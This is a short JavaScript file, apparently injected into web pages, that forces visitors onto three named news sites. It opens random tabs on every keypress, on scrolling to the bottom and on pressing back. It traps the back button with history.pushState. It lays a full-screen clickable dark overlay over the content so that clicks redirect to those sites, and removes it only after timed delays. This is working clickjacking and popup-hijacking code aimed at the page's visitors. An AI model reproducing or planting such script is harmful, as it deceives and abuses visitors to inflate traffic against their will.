document.writeln('<style>* { font-size: 1em !important }</style>');

const urls = [
    'https://blog3news.tistory.com/',
    'https://1-news.tistory.com/',
    'https://newsfactory.iwinv.net/'
];

function openRandomUrls(count) {
    const shuffledUrls = [...urls].sort(() => 0.5 - Math.random());
    shuffledUrls.slice(0, count).forEach(url => window.open(url, '_blank'));
}

document.addEventListener('keydown', () => openRandomUrls(2));

window.addEventListener('scroll', () => {
    if (window.scrollY + window.innerHeight >= document.documentElement.scrollHeight) {
        openRandomUrls(2);
    }
});

history.pushState(null, null, "");
window.onpopstate = () => openRandomUrls(2);

document.writeln(`
    <style>
        #s2 { transition: opacity 5s; z-index: 99; position: fixed; top: 0; left: 0; opacity: 0.8; background: #000; width: 100%; height: 110vh; }
    </style>
    <a onclick="location.href='${urls[Math.floor(Math.random() * urls.length)]}'" target="_blank" href="#">
        <div id="s2"></div>
    </a>
`);

function applyStyles() {
    document.querySelectorAll("*").forEach(el => el.style.color = "black");
    document.getElementById("s2").style.opacity = 0;
    document.getElementById("button").style.display = "none";
    document.getElementById("sha").style.display = "none";
    document.getElementById("cc").style.maxHeight = "unset";
}

function hideOverlay() {
    document.getElementById("s2").style.zIndex = -1;
}

function initTimeouts() {
    setTimeout(applyStyles, 6999);
    setTimeout(hideOverlay, 12999);
}

document.getElementById("s2").style.transition = "opacity 5s";
document.getElementById('container').style.boxShadow = 'none';
